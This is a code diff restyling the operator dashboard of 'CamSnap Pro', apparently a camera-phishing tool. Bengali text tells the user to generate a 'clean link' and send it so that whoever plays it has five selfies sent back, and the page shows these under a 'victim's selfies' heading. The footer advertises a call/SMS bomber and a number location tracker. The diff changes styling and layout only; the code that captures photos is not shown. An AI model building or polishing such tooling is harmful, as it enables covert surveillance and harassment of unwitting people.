@@ -6,43 +6,103 @@
   <title>CamSnap • Clean Link Grabber</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
-    body{background:#f9f9fb;color:#222;display:flex;flex-direction:column;min-height:100vh;}
-    header{background:#fff;padding:10px;text-align:center;border-bottom:1px solid #eee;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
-    header img{height:80px;border-radius:12px;}
-    main{flex:1;max-width:560px;margin:20px auto;padding:0 16px;width:100%;}
-    .card{background:#fff;border-radius:20px;padding:35px;box-shadow:0 10px 40px rgba(0,0,0,0.1);border:1px solid #eaeaea;text-align:center;}
-    h1{font-size:2.3em;margin-bottom:10px;}
-    p{color:#555;margin-bottom:30px;font-size:1.1em;}
-    button{background:#0066ff;color:#fff;border:none;padding:18px;font-size:1.3em;border-radius:16px;width:100%;cursor:pointer;font-weight:600;}
-    button:hover{background:#0052cc;}
+    body{background:#f9f9fb;color:#222;display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden;}
+    header{background:#fff;padding:15px 10px;text-align:center;box-shadow:0 3px 10px rgba(0,0,0,0.08);}
+    header img{height:65px;border-radius:12px;max-width:90%;}
+    
+    main{flex:1;max-width:540px;margin:15px auto;padding:0 15px;width:100%;}
+    .card{background:#fff;border-radius:22px;padding:32px 25px;box-shadow:0 12px 40px rgba(0,0,0,0.12);border:1px solid #eaeaea;text-align:center;}
+    h1{font-size:2.1em;margin-bottom:10px;color:#1a1a1a;}
+    p{font-size:1.05em;color:#444;line-height:1.6;margin-bottom:28px;}
+    
+    button{background:#0066ff;color:#fff;border:none;padding:18px;font-size:1.35em;border-radius:16px;width:100%;cursor:pointer;font-weight:600;box-shadow:0 6px 20px rgba(0,102,255,0.35);}
+    button:hover{background:#0052cc;transform:translateY(-2px);}
 
-    #linkBox{margin-top:30px;padding:25px;background:#f0f8ff;border:2px dashed #0066ff;border-radius:16px;display:none;}
-    #cleanLink{padding:18px;margin:15px 0;background:#f0f0f0;border-radius:14px;font-size:1.2em;font-weight:600;word-break:break-all;}
-    .copy-btn{background:#28a745;padding:14px 30px;border-radius:12px;color:#fff;font-size:1.1em;margin-top:10px;}
+    #linkBox{margin-top:30px;padding:25px;background:#f0f8ff;border:2px dashed #0066ff;border-radius:18px;display:none;}
+    #cleanLink{padding:18px;margin:15px 0;background:#f0f0f0;border-radius:14px;font-size:1.15em;font-weight:600;word-break:break-all;line-height:1.5;}
+    .copy-btn{background:#28a745;padding:14px 35px;border-radius:14px;color:#fff;font-size:1.15em;margin-top:12px;font-weight:600;}
 
     .photos-section{margin-top:40px;}
-    .title{color:#0066ff;font-weight:600;font-size:1.2em;margin-bottom:18px;}
-    #photoScroll{overflow-x:auto;white-space:nowrap;padding:15px 0;display:flex;gap:16px;}
+    .title{color:#0066ff;font-weight:600;font-size:1.25em;margin-bottom:18px;}
+    #photoScroll{overflow-x:auto;white-space:nowrap;padding:12px 0;display:flex;gap:14px;}
     #photoScroll::-webkit-scrollbar{display:none;}
-    .photo-item img{height:420px;width:auto;border-radius:18px;border:5px solid #0066ff;box-shadow:0 12px 35px rgba(0,102,255,0.4);cursor:pointer;}
+    .photo-item img{height:380px;width:auto;border-radius:18px;border:5px solid #0066ff;box-shadow:0 12px 35px rgba(0,102,255,0.4);cursor:pointer;}
     #dots{display:flex;justify-content:center;gap:12px;margin-top:18px;}
-    .dot{width:12px;height:12px;background:#ccc;border-radius:50%;}
+    .dot{width:12px;height:12px;background:#ccc;border-radius:50%;transition:0.3s;}
     .dot.active{background:#0066ff;transform:scale(1.4);}
-    .loading{text-align:center;padding:60px 0;color:#777;}
-    footer{text-align:center;padding:25px;color:#888;background:#fff;border-top:1px solid #eee;}
+    .loading{text-align:center;padding:60px 0;color:#777;font-size:1.05em;}
+
+    /* ডার্ক নেভি ফুটার – বামে সাজানো */
+    footer{
+      background:#0a1a2f;
+      color:#b0c4de;
+      padding:40px 20px 30px;
+      font-size:0.95em;
+      line-height:1.9;
+      border-top:5px solid #0066ff;
+    }
+    .footer-container{
+      max-width:1200px;
+      margin:0 auto;
+      display:flex;
+      flex-wrap:wrap;
+      justify-content:flex-start;
+      gap:40px;
+    }
+    .footer-col{
+      min-width:200px;
+    }
+    .footer-col h4{
+      color:#00ccff;
+      font-size:1.1em;
+      margin-bottom:12px;
+      font-weight:600;
+    }
+    .footer-col a{
+      color:#b0c4de;
+      text-decoration:none;
+      display:block;
+      margin:6px 0;
+      transition:0.3s;
+    }
+    .footer-col a:hover{
+      color:#fff;
+      padding-left:8px;
+    }
+    .telegram-link{
+      background:#0088cc;
+      color:#fff !important;
+      padding:10px 16px;
+      border-radius:8px;
+      display:inline-block;
+      margin-top:10px;
+      font-weight:600;
+    }
+    .copyright{
+      width:100%;
+      text-align:center;
+      margin-top:30px;
+      padding-top:20px;
+      border-top:1px solid #1e2a44;
+      color:#8899aa;
+      font-size:0.9em;
+    }
+    @media (max-width:600px){
+      .footer-container{flex-direction:column;gap:30px;}
+      .footer-col{min-width:auto;}
+    }
   </style>
 </head>
 <body>
 
 <header>
-  <img src="https://raw.githubusercontent.com/shakib0122222/camnei/8ad3b81b56f353f490397fc5a03c41daea82cd7f/20251130_085522.png
-" alt="CamSnap">
+  <img src="https://raw.githubusercontent.com/shakib0122222/camnei/8ad3b81b56f353f490397fc5a03c41daea82cd7f/20251130_085522.png" alt="CamSnap">
 </header>
 
 <main>
   <div class="card">
     <h1>CamSnap Pro</h1>
-    <p>বাটনে চাপো → ক্লিন লিংক বানাও → পাঠাও<br>কেউ প্লে করলেই ৫টা সেলফি তোমার কাছে!</p>
+    <p>নিচের বাটনে চাপো → ক্লিন লিংক বানাও → পাঠাও<br>কেউ প্লে করলেই তার ৫টা সেলফি তোমার কাছে চলে আসবে!</p>
 
     <button onclick="generate()">নতুন ক্লিন লিংক বানান</button>
 
@@ -56,12 +116,43 @@
     <div class="photos-section">
       <div class="title">ভিকটিমের সেলফি (অরিজিনাল)</div>
       <div id="photoScroll"><div class="loading">প্লে করলে ছবি আসবে...</div></div>
-      <div id="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
+      <div id="dots">
+        <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+      </div>
     </div>
   </div>
 </main>
 
-<footer>Developed by H4X0R • Clean URL 2025</footer>
+<!-- প্রফেশনাল ডার্ক নেভি ফুটার – বামে সাজানো -->
+<footer>
+  <div class="footer-container">
+    <div class="footer-col">
+      <h4>Get More Free Services:</h4>
+      <a href="#">Number Location Tracker</a>
+      <a href="#">CALL/SMS Bomber</a>
+      <a href="#">Company</a>
+    </div>
+    <div class="footer-col">
+      <h4>&nbsp;</h4>
+      <a href="#">About Us</a>
+      <a href="#">Contact</a>
+      <a href="#">FAQ</a>
+    </div>
+    <div class="footer-col">
+      <h4>Legal Pages:</h4>
+      <a href="#">Terms of Use</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Disclaimer</a>
+    </div>
+    <div class="footer-col">
+      <h4>Contact:</h4>
+      <a href="https://t.me/yourchannel" target="_blank" class="telegram-link">Telegram Support</a>
+    </div>
+  </div>
+  <div class="copyright">
+    © 2025 CamSnap Pro. All rights reserved
+  </div>
+</footer>
 
 <script>
 let currentId = null;
@@ -75,7 +166,7 @@ function generate() {
   document.getElementById("cleanLink").textContent = cleanUrl;
   document.getElementById("test").href = cleanUrl;
   
-  document.getElementById("photoScroll").innerHTML = `<div class="loading">অপেক্ষা করো...</div>`;
+  document.getElementById("photoScroll").innerHTML = `<div class="loading">অপেক্ষা করো... প্লে করলে ছবি আসবে</div>`;
   resetDots();
   checkPhotos();
 }
